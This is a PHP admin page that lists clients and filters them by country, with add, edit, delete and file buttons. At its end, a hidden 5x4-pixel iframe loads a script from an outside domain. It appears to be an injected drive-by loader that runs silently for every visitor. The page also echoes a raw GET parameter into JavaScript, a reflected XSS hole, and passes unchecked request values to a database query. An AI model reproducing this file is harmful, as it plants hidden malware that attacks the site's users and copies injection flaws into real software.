<?
	$Sql_result = $ManCli->ListClientes($_GET["pais"], $_GET["order"]);
	$total = $SqlSrv->dbNumRows($Sql_result);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> .:: TBX | Admin ::. </TITLE>

<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../styles/styles.css">

<!-- ADMNINISTRACION -->
<script language="javascript" src="../javascript/m_clientes.js"></script>

<script language="javascript">
	//STRING PARA EL ORDER BY//
	src = "clientes.php?pais=<?=$_GET['pais']?>";
</script>
</HEAD>

<BODY>

			<!-- LISTADO -->
			<table cellpadding=0 cellspacing=0 border=0 class="marco_blanco">
				<tr> 
					<td>
					<!-- LISTADO DE SECCIONES -->
					<table cellpadding=2 cellspacing=0 border=0 width="100%">
						<tr> 
							<td colspan="2"><div class="sep"><spacer type=block width=1 height=1></div></td>
							</tr>
						<tr>
							<td class="txt"><img src="../img/fl.gif" width="5" height="9" hspace="5">Desde aquí puede editar y agregar nuevos <B>clientes</B>.</td>
							<td align="right"><input type="button" class="actionButton" value="Agregar" onclick="Add()"></td>
						</tr>
						<tr> 
							<td colspan="2"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						<tr>
							<td class="txt">
							<TABLE cellpadding=0 cellspacing=0 border=0>
								<TR>
									<TD class="txt"><img src="../img/fl.gif" width="5" height="9" hspace="5">Filtrar por pais:&nbsp;</TD>
									<TD><select name="pais" class="input" onchange="Filtrar(this.value);">
										<option value="">-- Todos --
										<option value="1" <?if ($_GET["pais"]=="1")echo "selected";?>>Argentina
										<option value="2" <?if ($_GET["pais"]=="2")echo "selected";?>>Brasil
										<option value="3" <?if ($_GET["pais"]=="3")echo "selected";?>>Chile
									</select></TD>
								</TR>
							</TABLE>
							</td>
							<td align="right">&nbsp;</td>
						</tr>
						<tr> 
							<td colspan="2"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					<br>
					<table width="100%" border="0" cellpadding="2" cellspacing="0">
						<tr>
							<td width="15"></td>
							<td class=txt>[ <A HREF="javascript:OrderBy('cliente')" class="txtLink">Nombre</A> ]</td>
							<td class=txt>[ <A HREF="javascript:OrderBy('pais')" class="txtLink">Pais</A> ]</td>
							<td></td>
						</tr>
					<?
						if ($total>0){

						for ($i=0; $i<$total; $i++) {
							$row = mysql_fetch_array($Sql_result);
							
							$id			= $row['id'];
							$cliente	= $row['cliente'];
							$pais		= $row['pais'];

							switch ($pais){
								case "1":  $pais= "Argentina"; break;
								case "2":  $pais= "Brasil"; break;
								case "3":  $pais= "Chile"; break;
							}
							
					?>
						<tr> 
							<td colspan="4"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						<tr> 
							<td valign=top align=center><img src="../img/fl.gif" width=5 height=9 vspace=5></td>
							<td class="sub"><?=$cliente? $cliente:'&nbsp;'?></td>
							<td class="txt"><?=$pais? $pais:'&nbsp;'?></td>
							<td width="1%" align="right"><input type="button" class="actionButton" value="Ver Link" onclick="VerLink(<?=$id?>)">&nbsp;<input type="button" class="actionButton" value="Archivos" onclick="Archivos(<?=$id?>)">&nbsp;<input type="button" class="actionButton" value="Editar" onclick="Edit(<?=$id?>)">&nbsp;<input type="button" class="actionButton" value="Borrar" onclick="Del(<?=$id?>)"></td>
						</tr>
					<?
						}
						} else {
					?>
						<tr> 
							<td colspan="4"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						<tr> 
							<td class="txt" colspan="4" align="center">No se encontraron registros</td>
						</tr>
					<?
						}
					?>
						<tr> 
							<td colspan="4"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					<br>
					</td>
				</tr>
			</table>

		
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
